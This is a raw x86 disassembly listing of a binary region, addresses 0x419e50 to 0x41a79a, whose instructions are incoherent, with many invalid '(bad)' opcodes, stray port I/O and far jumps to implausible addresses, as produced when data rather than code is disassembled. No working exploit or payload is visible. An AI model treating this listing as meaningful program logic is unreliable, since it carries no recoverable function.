  419e50:	fild   WORD PTR [eax+0x5da8051f]
  419e56:	inc    edi
  419e57:	sub    edx,ebp
  419e59:	(bad)  
  419e5a:	retf   0x4a3e
  419e5d:	mov    BYTE PTR [esi+0x4b],cl
  419e60:	mov    ds:0xbc1e666e,al
  419e65:	ins    BYTE PTR es:[edi],dx
  419e66:	jmp    0x419e8a
  419e68:	dec    ebp
  419e69:	mov    edi,0xb98ca2d
  419e6e:	fcom   st(7)
  419e70:	in     eax,dx
  419e71:	das    
  419e72:	mov    ebp,0xb6002a7c
  419e77:	xchg   edx,edi
  419e79:	or     BYTE PTR [edx],al
  419e7b:	les    edi,FWORD PTR [esi+0x24]
  419e7e:	cwde   
  419e7f:	add    bh,al
  419e81:	jb     0x419e4a
  419e83:	gs (bad) 
  419e85:	sub    eax,0x6bd920f0
  419e8a:	outs   dx,DWORD PTR ds:[esi]
  419e8b:	imul   esp,ebx,0x723abc72
  419e91:	mov    ds:0x92848dbc,al
  419e96:	fs dec esi
  419e98:	or     ecx,DWORD PTR [ebp-0x71bcf9e7]
  419e9e:	nop
  419e9f:	adc    BYTE PTR [edi],bl
  419ea1:	pop    es
  419ea2:	lods   al,BYTE PTR ds:[esi]
  419ea3:	xchg   ebx,eax
  419ea4:	xchg   ecx,eax
  419ea5:	scas   al,BYTE PTR es:[edi]
  419ea6:	cdq    
  419ea7:	retf   0xf816
  419eaa:	xor    ch,BYTE PTR [ebp+0x50]
  419ead:	sti    
  419eae:	loop   0x419ec1
  419eb0:	pop    edx
  419eb1:	cld    
  419eb2:	push   esi
  419eb3:	add    al,0xb1
  419eb5:	(bad)  
  419eb6:	push   ss
  419eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb8:	in     eax,0x32
  419eba:	adc    ah,dl
  419ebc:	jge    0x419e5d
  419ebe:	sub    edx,DWORD PTR [edx-0x7f0cbbb3]
  419ec4:	cld    
  419ec5:	fisttp DWORD PTR [esi]
  419ec7:	xor    ah,ah
  419ec9:	mov    WORD PTR [edi+edi*4+0x66],?
  419ecd:	out    0x9,al
  419ecf:	sti    
  419ed0:	xchg   esp,eax
  419ed1:	pop    esp
  419ed2:	adc    edx,esi
  419ed4:	mov    esi,0xc976dd50
  419ed9:	sti    
  419eda:	or     edi,edx
  419edc:	out    0x2,eax
  419ede:	pop    edx
  419edf:	xor    eax,DWORD PTR [eax+esi*8+0x1d88d1f7]
  419ee6:	cli    
  419ee7:	xor    BYTE PTR [esi-0x7d469f1b],ch
  419eed:	jno    0x419efb
  419eef:	fs scas eax,DWORD PTR es:[edi]
  419ef1:	mov    edi,0x8290cf62
  419ef6:	pop    ds
  419ef7:	adc    DWORD PTR [esi+0x6d218a98],edx
  419efd:	xchg   BYTE PTR [edi-0x45f84342],bl
  419f03:	cmp    eax,0xf2b8294c
  419f08:	sbb    al,0x93
  419f0a:	aaa    
  419f0b:	and    esi,esi
  419f0d:	and    al,0xfb
  419f0f:	clc    
  419f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f11:	out    dx,eax
  419f12:	iret   
  419f13:	jmp    0x7930eeae
  419f18:	adc    BYTE PTR [ecx-0x47173d8e],bl
  419f1e:	lea    ecx,[ebp-0x1b]
  419f21:	arpl   WORD PTR [edi],ax
  419f23:	dec    edi
  419f24:	retf   
  419f25:	mov    ebx,0x3331d11e
  419f2a:	jg     0x419ef2
  419f2c:	pop    edi
  419f2d:	sub    BYTE PTR [edi+0x3f],0x18
  419f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f32:	mov    al,ds:0xd13c83d9
  419f37:	(bad)  
  419f38:	pop    eax
  419f39:	stos   DWORD PTR es:[edi],eax
  419f3a:	jmp    0x969b3672
  419f3f:	fcomp  DWORD PTR [edi-0x37]
  419f42:	xchg   esi,eax
  419f43:	adc    BYTE PTR ds:0x597e8798,al
  419f49:	jo     0x419f62
  419f4b:	retf   
  419f4c:	sub    DWORD PTR [esi-0x43],ebx
  419f4f:	xor    al,0x10
  419f51:	scas   al,BYTE PTR es:[edi]
  419f52:	in     al,0xfe
  419f54:	in     al,0xb4
  419f56:	syscall 
  419f58:	repnz mov esi,0x3a08b69b
  419f5e:	test   bh,bl
  419f60:	test   DWORD PTR [ecx+0x3b5e6255],ebp
  419f66:	xchg   BYTE PTR [ecx+0x2],ah
  419f69:	call   0x3c9bfb5a
  419f6e:	push   ss
  419f6f:	ficom  DWORD PTR [edi]
  419f71:	pusha  
  419f72:	daa    
  419f73:	outs   dx,DWORD PTR ds:[esi]
  419f74:	mov    eax,0xdeb9407f
  419f79:	cmc    
  419f7a:	jecxz  0x419f79
  419f7c:	lock ins DWORD PTR es:[edi],dx
  419f7e:	popa   
  419f7f:	bound  edi,QWORD PTR ds:0x4b1f9e97
  419f85:	icebp  
  419f86:	xchg   esp,eax
  419f87:	and    ecx,DWORD PTR [ecx-0x2b811bb8]
  419f8d:	ret    0x8bc8
  419f90:	stos   BYTE PTR es:[edi],al
  419f91:	mov    dh,0xea
  419f93:	add    eax,0x3909f8d7
  419f98:	rol    DWORD PTR [ecx],cl
  419f9a:	adc    BYTE PTR [edi+eax*2],al
  419f9d:	repz aad 0xb5
  419fa0:	inc    edx
  419fa1:	and    DWORD PTR [ebx+0x72],0xc307258d
  419fa8:	(bad)  
  419fa9:	sbb    DWORD PTR [ecx],edi
  419fab:	bndstx [ebx],bnd2
  419fae:	loope  0x419fbe
  419fb0:	cmp    ch,al
  419fb2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419fb4:	(bad)  
  419fb6:	jg     0x419f7d
  419fb8:	mov    ebx,0x3cdc92e0
  419fbd:	mov    esi,0x871fbe5f
  419fc2:	jl     0x419fe0
  419fc4:	mov    bh,BYTE PTR [esp]
  419fc7:	idiv   BYTE PTR [edx]
  419fc9:	call   0x402e:0x8186cbe5
  419fd0:	jmp    0x36452821
  419fd5:	pop    eax
  419fd6:	mov    ebp,0xae0ed82f
  419fdb:	mov    esp,0x2a9b8175
  419fe0:	scas   eax,DWORD PTR es:[edi]
  419fe1:	sub    eax,0x4ed0d807
  419fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fe7:	(bad)  
  419fe8:	mov    esi,0x7775d829
  419fed:	mov    cl,0x3d
  419fef:	(bad)  
  419ff0:	fadd   DWORD PTR [edi-0x2a81090b]
  419ff6:	inc    esp
  419ff7:	jmp    0x677cb2a9
  419ffc:	retf   0xecb2
  419fff:	push   ebx
  41a000:	cld    
  41a001:	jnp    0x41a010
  41a003:	sbb    esp,DWORD PTR [edx]
  41a005:	in     al,0x4
  41a007:	into   
  41a008:	loopne 0x419fa1
  41a00a:	repz aaa 
  41a00c:	or     dh,bl
  41a00e:	rcl    DWORD PTR [ebx-0x199c7ef5],1
  41a014:	scas   eax,DWORD PTR es:[edi]
  41a015:	inc    esi
  41a016:	sbb    DWORD PTR [ebx],edi
  41a018:	imul   edi,DWORD PTR [ebp-0x2f],0xffffff95
  41a01c:	pop    ss
  41a01d:	pusha  
  41a01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a01f:	pop    edi
  41a020:	stc    
  41a021:	shl    BYTE PTR [ecx],cl
  41a023:	cmp    bl,BYTE PTR [edx-0x145d7ad1]
  41a029:	push   esi
  41a02a:	out    dx,al
  41a02b:	rcl    edi,0xb3
  41a02e:	push   edx
  41a02f:	adc    al,BYTE PTR [ecx+0x41]
  41a032:	(bad)  
  41a033:	xchg   ebp,eax
  41a034:	jl     0x41a077
  41a036:	fs hlt 
  41a038:	lods   al,BYTE PTR ds:[esi]
  41a039:	sti    
  41a03a:	in     al,0x35
  41a03c:	pop    es
  41a03d:	mov    edi,0x6cbe94a6
  41a042:	mov    ebp,0x33706b2f
  41a047:	repz sti 
  41a049:	popa   
  41a04a:	aas    
  41a04b:	inc    eax
  41a04c:	add    ebx,DWORD PTR [edi+0x39f45e87]
  41a052:	cmp    DWORD PTR ds:0xc208f69d,esi
  41a058:	inc    ebx
  41a059:	adc    bh,al
  41a05b:	sbb    al,BYTE PTR [eax+ecx*4-0x305098ef]
  41a062:	or     al,0xcd
  41a064:	mov    WORD PTR [ebp+0x1c],ss
  41a067:	enter  0x1a75,0x5c
  41a06b:	mov    bh,0xd4
  41a06d:	cmp    al,0x2d
  41a06f:	dec    esp
  41a070:	and    BYTE PTR [ecx+0x2a],0x8d
  41a074:	or     dl,cl
  41a076:	retf   
  41a077:	jbe    0x41a03d
  41a079:	ret    
  41a07a:	(bad)  
  41a07b:	dec    esp
  41a07c:	rcr    BYTE PTR [edx+0x614a46e9],cl
  41a082:	jecxz  0x41a0de
  41a084:	and    esp,ebx
  41a086:	mov    al,es:0xd1fc69c1
  41a08c:	or     eax,0x902aca3
  41a091:	mov    ebp,0xa45630ce
  41a096:	cwde   
  41a097:	mov    eax,0x49f48741
  41a09c:	int    0xc1
  41a09e:	std    
  41a09f:	in     eax,dx
  41a0a0:	inc    esi
  41a0a1:	outs   dx,BYTE PTR ds:[esi]
  41a0a2:	mul    DWORD PTR [edi+0x104a3153]
  41a0a8:	mov    ch,0x2f
  41a0aa:	out    0x1,al
  41a0ac:	aam    0x92
  41a0ae:	shl    BYTE PTR [ebp-0x1e08f8ba],cl
  41a0b4:	loop   0x41a05d
  41a0b6:	push   eax
  41a0b7:	sbb    BYTE PTR [ebx-0x7b],0xf5
  41a0bb:	das    
  41a0bc:	fisub  DWORD PTR [esp+edx*1+0x30]
  41a0c0:	or     eax,0x423bf718
  41a0c5:	mov    bh,0x90
  41a0c7:	push   0x33
  41a0c9:	ret    0xfc64
  41a0cc:	fsubr  DWORD PTR [edi+0x7b]
  41a0cf:	jae    0x41a0d2
  41a0d1:	iret   
  41a0d2:	test   eax,0xba346dd6
  41a0d7:	or     BYTE PTR [edx-0x481f17e1],bl
  41a0dd:	push   ss
  41a0de:	sbb    esp,ecx
  41a0e0:	cmp    cl,ch
  41a0e2:	stos   DWORD PTR es:[edi],eax
  41a0e3:	xchg   esp,eax
  41a0e4:	(bad)  
  41a0e5:	xchg   edx,eax
  41a0e6:	retf   
  41a0e7:	jmp    0xcf50:0x738893c1
  41a0ee:	adc    BYTE PTR [edi],al
  41a0f0:	outs   dx,DWORD PTR ds:[esi]
  41a0f1:	and    ebx,DWORD PTR [bp-0x633f]
  41a0f6:	stc    
  41a0f7:	stos   DWORD PTR es:[edi],eax
  41a0f8:	sahf   
  41a0f9:	push   ds
  41a0fa:	cmp    al,0x27
  41a0fc:	loopne 0x41a082
  41a0fe:	mov    ebx,0x417e604e
  41a103:	pop    ds
  41a104:	jne    0x41a0da
  41a106:	mov    dh,0xf2
  41a108:	lahf   
  41a109:	push   ecx
  41a10a:	cmp    al,0x6
  41a10c:	sbb    ax,0x31fb
  41a110:	mov    DWORD PTR ss:[edi+0x6c57856f],esi
  41a117:	int    0x85
  41a119:	and    ebp,ecx
  41a11b:	(bad)  
  41a11c:	cmp    BYTE PTR [ebp+0x379375eb],bh
  41a122:	fbld   TBYTE PTR [esi]
  41a124:	mov    DWORD PTR [ebx+eax*1],ecx
  41a127:	sbb    eax,0xbde506bc
  41a12c:	inc    ebp
  41a12d:	icebp  
  41a12e:	inc    edx
  41a12f:	push   edx
  41a130:	cmc    
  41a131:	jle    0x41a194
  41a133:	adc    BYTE PTR [ecx],ch
  41a135:	vmread DWORD PTR [edi-0x2f],eax
  41a139:	cwde   
  41a13a:	call   0x493f:0xfa5eb62e
  41a141:	out    dx,al
  41a142:	imul   esi,DWORD PTR [eax+edi*1-0x7ee229b9],0xffffffde
  41a14a:	mov    edi,0x524380ca
  41a14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a150:	xchg   al,bh
  41a152:	int    0x57
  41a154:	pop    edx
  41a155:	aaa    
  41a156:	sub    eax,0xfcb4c8a2
  41a15b:	add    DWORD PTR [ecx+0x48],eax
  41a15e:	push   0x4d71efa8
  41a163:	dec    ebp
  41a164:	jo     0x41a192
  41a166:	push   edx
  41a167:	jns    0x41a145
  41a169:	jno    0x41a145
  41a16b:	les    ecx,FWORD PTR [edi-0x2f25832]
  41a171:	aad    0x99
  41a173:	push   esi
  41a174:	cwde   
  41a175:	je     0x41a1a2
  41a177:	xchg   esi,eax
  41a178:	and    BYTE PTR [ebp+0x5f733db7],0x9a
  41a17f:	jecxz  0x41a178
  41a181:	cmp    eax,0x9bddcd99
  41a186:	pop    ecx
  41a187:	mov    WORD PTR [edi+0x71],?
  41a18a:	mov    bl,0xa3
  41a18c:	loope  0x41a1b2
  41a18e:	xchg   ebp,eax
  41a18f:	sub    ah,BYTE PTR [esi+0x36]
  41a192:	add    eax,0xaaa1acbd
  41a197:	lock inc ebx
  41a199:	mov    dh,cl
  41a19b:	push   ebx
  41a19c:	iret   
  41a19d:	and    eax,ebx
  41a19f:	pop    edx
  41a1a0:	stc    
  41a1a1:	js     0x41a1e9
  41a1a3:	lea    ebx,[ebp+0x4eb7bad8]
  41a1a9:	jno    0x41a1f2
  41a1ab:	pop    ss
  41a1ac:	push   ebx
  41a1ad:	adc    al,0xaa
  41a1af:	jb     0x41a1d0
  41a1b1:	sbb    eax,0xbaf95b6d
  41a1b6:	cwde   
  41a1b7:	xor    dh,BYTE PTR [edx+ebx*4-0x231ed338]
  41a1be:	sub    al,0x1c
  41a1c0:	sub    dl,BYTE PTR [esi+0x1d]
  41a1c3:	pop    edx
  41a1c4:	call   0x42b764fc
  41a1c9:	or     ecx,edi
  41a1cb:	les    ebp,FWORD PTR ds:0x30fd55cf
  41a1d1:	mov    ecx,ebp
  41a1d3:	inc    esi
  41a1d4:	and    al,0xf2
  41a1d6:	and    al,0xe2
  41a1d8:	in     eax,0xea
  41a1da:	pop    ds
  41a1db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1dc:	adc    DWORD PTR [esi+ebp*4+0x363bcbfd],edi
  41a1e3:	jge    0x41a1f2
  41a1e5:	pop    edi
  41a1e6:	mov    al,0xf
  41a1e8:	add    DWORD PTR [edx+0x693cbe50],eax
  41a1ee:	cmp    BYTE PTR [ecx+0x63],al
  41a1f1:	sub    DWORD PTR [esi-0x182391ef],ecx
  41a1f7:	mov    ebp,0x5133a9f1
  41a1fc:	sbb    BYTE PTR [edi],dl
  41a1fe:	mov    eax,0x5f8dab04
  41a203:	shl    al,1
  41a205:	or     dh,BYTE PTR [edi-0x62]
  41a208:	dec    ebx
  41a209:	mov    eax,ds:0xc18d2e6a
  41a20e:	mov    ebx,0x9bf479e3
  41a213:	xor    BYTE PTR [ebx-0x2b],bh
  41a216:	and    ecx,DWORD PTR [ebp+0x13fe2858]
  41a21c:	mov    al,0xc4
  41a21e:	outs   dx,BYTE PTR ds:[esi]
  41a21f:	inc    eax
  41a220:	add    eax,eax
  41a222:	imul   edi,edx,0xd6b6425c
  41a228:	repnz sbb al,0x4a
  41a22b:	shl    BYTE PTR [edx],cl
  41a22d:	loop   0x41a25b
  41a22f:	sbb    dl,BYTE PTR [edx+esi*8]
  41a232:	mov    ch,0xc
  41a234:	adc    BYTE PTR [ebp+0x39],0x4e
  41a238:	in     al,0x22
  41a23a:	js     0x41a235
  41a23c:	push   eax
  41a23d:	push   edi
  41a23e:	mov    eax,0x685e08a9
  41a243:	pushf  
  41a244:	cmc    
  41a245:	or     edx,edx
  41a247:	mov    eax,0x570cb42
  41a24c:	mov    ds,WORD PTR [ebx-0x58]
  41a24f:	and    al,0x83
  41a251:	hlt    
  41a252:	mov    BYTE PTR [esi],0x35
  41a255:	shl    BYTE PTR [edi+0x12],cl
  41a258:	fwait
  41a259:	sbb    eax,0xe4243a0a
  41a25e:	xlat   BYTE PTR ds:[ebx]
  41a25f:	add    bh,BYTE PTR [ecx-0x51d95ff1]
  41a265:	loopne 0x41a2d9
  41a267:	imul   esi
  41a269:	mov    BYTE PTR [ebx],ch
  41a26b:	jb     0x41a28d
  41a26d:	jne    0x41a1fe
  41a26f:	inc    edx
  41a270:	test   eax,0x62be5b4f
  41a275:	retf   0x22f4
  41a278:	mov    esi,0x84ce84c6
  41a27d:	push   cs
  41a27e:	out    dx,eax
  41a27f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a280:	mov    ebx,0x3c5f8edc
  41a285:	mov    edx,DWORD PTR [ebx+ebp*8-0x63a77881]
  41a28c:	repz jb 0x41a29f
  41a28f:	mov    al,0x47
  41a291:	aas    
  41a292:	(bad)  
  41a293:	fbld   TBYTE PTR ds:0x3b
	...
  41a461:	add    BYTE PTR [esi+0x2b],dh
  41a464:	dec    eax
  41a465:	jbe    0x41a4c4
  41a467:	ja     0x41a4e7
  41a469:	sub    esi,DWORD PTR [ebp-0x4b]
  41a46c:	(bad)  
  41a46d:	retf   0xe89d
  41a470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a471:	fld    QWORD PTR [ebx]
  41a473:	add    eax,0x1a0002
  41a478:	add    BYTE PTR [eax],al
  41a47a:	imul   edi,DWORD PTR [eax-0x3b],0x3c
  41a47e:	sar    DWORD PTR [edx],0x4
  41a481:	mov    al,ds:0xafb614c4
  41a486:	add    dl,BYTE PTR ds:0x8103b1a3
  41a48c:	in     al,dx
  41a48d:	xchg   esi,eax
  41a48e:	add    BYTE PTR [esi],dl
  41a490:	sub    BYTE PTR [esi+0x76bf99d3],al
  41a496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a497:	xchg   ebp,eax
  41a498:	in     eax,dx
  41a499:	xlat   BYTE PTR ds:[ebx]
  41a49a:	mov    edi,0xa0a36c7e
  41a49f:	ror    BYTE PTR [edi],0xb9
  41a4a2:	mov    edx,ebp
  41a4a4:	(bad)  
  41a4a5:	test   BYTE PTR [ecx],0x0
  41a4a8:	push   ds
  41a4a9:	pop    es
  41a4aa:	add    BYTE PTR [eax],al
  41a4ac:	xchg   esp,eax
  41a4ad:	mov    al,0x3d
  41a4af:	lods   al,BYTE PTR ds:[esi]
  41a4b0:	icebp  
  41a4b1:	cmp    BYTE PTR [ebx],0xba
  41a4b4:	nop
  41a4b5:	jg     0x41a4aa
  41a4b7:	mov    eax,ds:0xfc828ff3
  41a4bc:	mov    ebx,0x47e34452
  41a4c1:	add    DWORD PTR [eax+ebx*1-0x3a69c70c],ebp
  41a4c8:	jl     0x41a4c5
  41a4ca:	sbb    BYTE PTR [edi],0x37
  41a4cd:	mov    esp,0xec997475
  41a4d2:	jo     0x41a469
  41a4d4:	test   eax,0x84e71715
  41a4d9:	inc    dl
  41a4db:	mov    edi,0x9105fe14
  41a4e0:	adc    DWORD PTR [ebp-0x72],ebp
  41a4e3:	adc    DWORD PTR [esi-0xb],esp
  41a4e6:	retf   
  41a4e7:	ins    DWORD PTR es:[edi],dx
  41a4e8:	sub    DWORD PTR [ecx+0x5ce070a9],ecx
  41a4ee:	aam    0xe6
  41a4f0:	pop    DWORD PTR [ebx+0x68]
  41a4f3:	inc    ebp
  41a4f4:	push   edx
  41a4f5:	aam    0x52
  41a4f7:	mov    dl,0x9c
  41a4f9:	dec    ebp
  41a4fa:	cwde   
  41a4fb:	sub    al,0x41
  41a4fd:	les    edi,FWORD PTR [edx]
  41a4ff:	jmp    0x41a516
  41a501:	mov    ah,BYTE PTR [esi]
  41a503:	pop    ebp
  41a504:	outs   dx,DWORD PTR ds:[esi]
  41a505:	jno    0x41a4f7
  41a507:	pop    ecx
  41a508:	mov    dh,0x2e
  41a50a:	sbb    ecx,DWORD PTR [ebp+0x3859ac62]
  41a510:	jb     0x41a4e1
  41a512:	and    BYTE PTR [edx+edx*2+0x35],0xd2
  41a517:	cdq    
  41a518:	sbb    ch,BYTE PTR [esi]
  41a51a:	sub    ecx,DWORD PTR [esi-0x18]
  41a51d:	stc    
  41a51e:	aad    0x19
  41a520:	cmp    edi,ebp
  41a522:	cmp    ah,BYTE PTR [ebx-0x61]
  41a525:	loope  0x41a4d3
  41a527:	shr    BYTE PTR [ebx],1
  41a529:	pop    edx
  41a52a:	pop    esp
  41a52b:	push   ss
  41a52c:	or     BYTE PTR [eax+0x71dabd53],dl
  41a532:	fdiv   DWORD PTR [edx+esi*1-0x2f5dfd39]
  41a539:	in     eax,0xa5
  41a53b:	xchg   ah,ah
  41a53d:	mov    al,0xc7
  41a53f:	xor    eax,0xb1332da1
  41a544:	sub    DWORD PTR [esi+0x46de790e],esi
  41a54a:	xchg   ebp,eax
  41a54b:	scas   al,BYTE PTR es:[edi]
  41a54c:	xor    bl,BYTE PTR [ebx-0x4c]
  41a54f:	mov    ch,0x49
  41a551:	and    BYTE PTR [ecx-0x17],cl
  41a554:	ds jecxz 0x41a509
  41a557:	adc    DWORD PTR [edi+eax*8-0x7d],ecx
  41a55b:	mov    WORD PTR [edi-0x60afd276],?
  41a561:	jae    0x41a555
  41a563:	ficomp WORD PTR [eax]
  41a565:	enter  0xa2a9,0xce
  41a569:	inc    ebx
  41a56a:	jg     0x41a587
  41a56c:	lahf   
  41a56d:	outs   dx,BYTE PTR ds:[esi]
  41a56e:	mov    WORD PTR [ebp+0x21eb8d97],ss
  41a574:	ja     0x41a59f
  41a576:	imul   esi,ecx,0xdc95d8ce
  41a57c:	(bad)  
  41a57d:	fadd   DWORD PTR [ebx*8-0x370f2d0a]
  41a584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a585:	(bad)  
  41a586:	scas   eax,DWORD PTR es:[edi]
  41a587:	add    bh,BYTE PTR [ebx+0x140b3fb5]
  41a58d:	outs   dx,BYTE PTR ds:[esi]
  41a58e:	adc    eax,DWORD PTR [eax]
  41a590:	xchg   cl,bh
  41a592:	arpl   WORD PTR [ecx+0x31b43b34],si
  41a598:	in     eax,dx
  41a599:	ins    DWORD PTR es:[edi],dx
  41a59a:	jmp    ebp
  41a59c:	xchg   DWORD PTR [esp+ecx*4+0x4d8a135b],esp
  41a5a3:	add    al,0x9
  41a5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a6:	mov    ds:0x4145ec3e,eax
  41a5ab:	mov    edx,0x111c05ee
  41a5b0:	dec    edx
  41a5b1:	sbb    ch,dl
  41a5b3:	out    dx,al
  41a5b4:	jne    0x41a57f
  41a5b6:	in     al,0xa7
  41a5b8:	mov    ch,0x86
  41a5ba:	jl     0x41a636
  41a5bc:	dec    esi
  41a5bd:	dec    esp
  41a5be:	jns    0x41a5c8
  41a5c0:	sub    bh,BYTE PTR [esi-0x347d8e56]
  41a5c6:	xchg   esp,eax
  41a5c7:	ins    BYTE PTR es:[edi],dx
  41a5c8:	push   eax
  41a5c9:	clts   
  41a5cb:	cmp    dh,ch
  41a5cd:	lods   eax,DWORD PTR ds:[esi]
  41a5ce:	push   ebp
  41a5cf:	mov    eax,ds:0xa77686c
  41a5d4:	pop    ecx
  41a5d5:	inc    ebx
  41a5d6:	sub    dl,BYTE PTR [esi-0x42]
  41a5d9:	(bad)  
  41a5da:	lods   eax,DWORD PTR ds:[esi]
  41a5db:	sub    ebx,DWORD PTR [ecx]
  41a5dd:	outs   dx,DWORD PTR ds:[esi]
  41a5de:	pop    es
  41a5df:	jbe    0x41a5ae
  41a5e1:	sbb    ah,BYTE PTR [ecx+0x72]
  41a5e4:	dec    esi
  41a5e5:	ss mov ebx,0x39d26018
  41a5eb:	jg     0x41a5fe
  41a5ed:	pop    esp
  41a5ee:	mov    WORD PTR [ecx+0x78],?
  41a5f1:	(bad)  
  41a5f2:	sub    al,0xcf
  41a5f4:	add    BYTE PTR [esp+ebx*8-0x17],cl
  41a5f8:	cmp    eax,0x2ce892c0
  41a5fd:	jecxz  0x41a646
  41a5ff:	and    esi,ebx
  41a601:	lods   eax,DWORD PTR ds:[esi]
  41a602:	cmp    DWORD PTR [esi+0x42],ebx
  41a605:	dec    ch
  41a607:	push   edi
  41a608:	ja     0x41a5af
  41a60a:	or     edx,DWORD PTR [eax+0x25]
  41a60d:	pop    esi
  41a60e:	push   edi
  41a60f:	sbb    edi,eax
  41a611:	mov    ds:0xcbce0836,eax
  41a616:	rcr    BYTE PTR [ecx-0x554d1fc6],cl
  41a61c:	js     0x41a5be
  41a61e:	test   eax,0x91631a4d
  41a623:	test   al,0x3f
  41a625:	adc    BYTE PTR [eax],0x42
  41a628:	(bad)  
  41a629:	aaa    
  41a62a:	popa   
  41a62b:	(bad)  
  41a62c:	sar    BYTE PTR ds:0x1d73273f,0xdf
  41a633:	lea    edx,[edx-0x8]
  41a636:	xchg   bl,dl
  41a638:	mov    al,ds:0xd943ebfe
  41a63d:	sti    
  41a63e:	cmp    eax,ebx
  41a640:	mov    WORD PTR [ebp-0x7d519df],ss
  41a646:	loope  0x41a68b
  41a648:	xor    bh,BYTE PTR [edx+0x7fe11a85]
  41a64e:	jmp    0x20245fc5
  41a653:	dec    ebx
  41a654:	inc    ebx
  41a655:	ins    DWORD PTR es:[edi],dx
  41a656:	(bad)  
  41a657:	pop    esi
  41a658:	out    0x6f,eax
  41a65a:	cmp    al,0xce
  41a65c:	adc    DWORD PTR [ecx+ecx*8+0x15],edx
  41a660:	fxch   st(0)
  41a662:	aad    0xad
  41a664:	pop    ss
  41a665:	and    al,0x4b
  41a667:	mov    edx,0x181b73f6
  41a66c:	sbb    ebp,DWORD PTR [ebp-0x2d0c334f]
  41a672:	adc    eax,0x41fede6
  41a677:	icebp  
  41a678:	xchg   ebx,eax
  41a679:	pop    ds
  41a67a:	in     eax,0xab
  41a67c:	in     al,dx
  41a67d:	jmp    0xca19ed61
  41a682:	call   0x39d5f94a
  41a687:	ja     0x41a6a4
  41a689:	jecxz  0x41a61f
  41a68b:	and    eax,0xc2d2c729
  41a690:	pop    ss
  41a691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a692:	jns    0x41a6d5
  41a694:	out    dx,eax
  41a695:	inc    esi
  41a696:	test   eax,0xf0cba6ef
  41a69b:	mov    ds:0x73a90395,al
  41a6a0:	data16 in al,dx
  41a6a2:	sbb    cl,BYTE PTR [ebx-0x52a20655]
  41a6a8:	pop    ds
  41a6a9:	stos   BYTE PTR es:[edi],al
  41a6aa:	xchg   esp,eax
  41a6ab:	arpl   WORD PTR [eax],di
  41a6ad:	xchg   esp,eax
  41a6ae:	sub    dl,bl
  41a6b0:	push   eax
  41a6b1:	clc    
  41a6b2:	lods   eax,DWORD PTR ds:[esi]
  41a6b3:	xor    eax,0xae1f75c5
  41a6b8:	shl    al,1
  41a6ba:	mov    DWORD PTR [esi-0x61],0xca755307
  41a6c1:	sub    al,0xb7
  41a6c3:	pusha  
  41a6c4:	lds    ecx,FWORD PTR [edi+edx*4]
  41a6c7:	icebp  
  41a6c8:	adc    DWORD PTR [ebx],esp
  41a6ca:	shl    DWORD PTR [ecx+0x6c330b75],cl
  41a6d0:	lahf   
  41a6d1:	add    ch,bh
  41a6d3:	or     al,0xfb
  41a6d5:	pop    ecx
  41a6d6:	dec    esi
  41a6d7:	mov    ch,0x57
  41a6d9:	lods   eax,DWORD PTR ds:[esi]
  41a6da:	add    edx,DWORD PTR [eax+0x1760040e]
  41a6e0:	repz jle 0x41a70b
  41a6e3:	mov    esp,0xd5ba4e29
  41a6e8:	call   0xb67355fd
  41a6ed:	or     dh,BYTE PTR [ecx+0x3f]
  41a6f0:	jo     0x41a6f9
  41a6f2:	or     eax,0x81dbcaa4
  41a6f7:	ds ret 
  41a6f9:	xchg   esi,eax
  41a6fa:	mov    edx,0xf45196a8
  41a6ff:	inc    esp
  41a700:	fcomp  QWORD PTR [eax+0x520e4982]
  41a706:	and    cl,BYTE PTR [esi+0x2d]
  41a709:	es ffreep st(4)
  41a70c:	xchg   DWORD PTR [ebx],esi
  41a70e:	gs or  al,0x13
  41a711:	(bad)  
  41a712:	ficomp WORD PTR [edx-0x5f682f10]
  41a718:	inc    ecx
  41a719:	es pop es
  41a71b:	fbld   TBYTE PTR [eax]
  41a71d:	cs leave 
  41a71f:	popf   
  41a720:	fwait
  41a721:	xor    BYTE PTR [edx-0x5],ah
  41a724:	fwait
  41a725:	or     eax,0x181474ba
  41a72a:	sub    dh,BYTE PTR [esi+0xe]
  41a72d:	jle    0x41a6dd
  41a72f:	and    BYTE PTR [edi+ebp*2+0x67],0xdd
  41a734:	mov    edx,0x587e924c
  41a739:	mov    dl,0x7e
  41a73b:	xchg   ebp,eax
  41a73c:	or     BYTE PTR [esi],cl
  41a73e:	fcmovb st,st(2)
  41a740:	outs   dx,DWORD PTR ds:[esi]
  41a741:	pop    eax
  41a742:	jbe    0x41a7a5
  41a744:	jne    0x41a7bf
  41a746:	test   dl,bh
  41a748:	fdiv   QWORD PTR [edx+0x49607aa3]
  41a74e:	cs adc eax,0x4c8f7640
  41a754:	ror    DWORD PTR [edi],cl
  41a756:	inc    edi
  41a757:	xchg   BYTE PTR [esi-0x3158935a],bh
  41a75d:	jle    0x41a6fe
  41a75f:	mov    edi,0xc081712c
  41a764:	inc    ebx
  41a765:	lock (bad) 
  41a767:	or     eax,0xfce6499f
  41a76c:	adc    al,0x6f
  41a76e:	cmp    DWORD PTR [edx+eax*8+0x2e],0x75
  41a773:	rcr    DWORD PTR [ebp+0x43a39fa8],cl
  41a779:	js     0x41a732
  41a77b:	mov    ch,0x19
  41a77d:	adc    al,0xd1
  41a77f:	pop    ss
  41a780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a781:	repz dec edx
  41a783:	leave  
  41a784:	inc    edi
  41a785:	xchg   ebx,eax
  41a786:	adc    BYTE PTR [esi+0x6a975c2b],bl
  41a78c:	cld    
  41a78d:	adc    eax,0x188e31a0
  41a792:	push   cs
  41a793:	dec    ebp
  41a794:	add    ebp,0xb8e6514d
  41a79a:	mov    bh,BYTE PTR [ebx+ebx*1+0x67]
